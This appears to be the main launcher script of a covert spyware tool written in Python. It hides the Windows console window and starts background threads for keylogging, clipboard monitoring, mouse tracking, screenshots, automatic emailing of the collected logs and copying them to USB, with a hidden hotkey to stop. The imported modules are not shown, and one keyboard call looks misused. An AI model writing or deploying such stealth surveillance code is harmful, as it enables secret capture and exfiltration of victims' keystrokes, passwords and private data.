import sys
import ctypes
import keyboard
import threading
from config import set_user
from modules import (
    keylogger,
    clipboard_monitor,
    mouse_tracker,
    screenshot_capture,
    email_sender,
    usb_extractor
)

stop_flag = False

def hide_console():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def start_stealth_monitoring():
    hide_console()
    
    # Start all modules
    threads = [
        threading.Thread(target=keylogger.start_keylogger, daemon=True),
        threading.Thread(target=clipboard_monitor.monitor_clipboard, daemon=True),
        threading.Thread(target=mouse_tracker.start_mouse_tracking, daemon=True),
        threading.Thread(target=screenshot_capture.capture_screenshot, daemon=True),
        threading.Thread(target=email_sender.auto_send_logs, daemon=True),
        threading.Thread(target=usb_extractor.copy_logs_to_usb, daemon=True)
    ]
    
    for t in threads:
        t.start()

    # Set exit hotkey
    keyboard.add_hotkey('ctrl+shift+x', lambda: globals().update(stop_flag=True))
    
    # Keep alive
    while not stop_flag:
        keyboard.wait(1)
    
    sys.exit(0)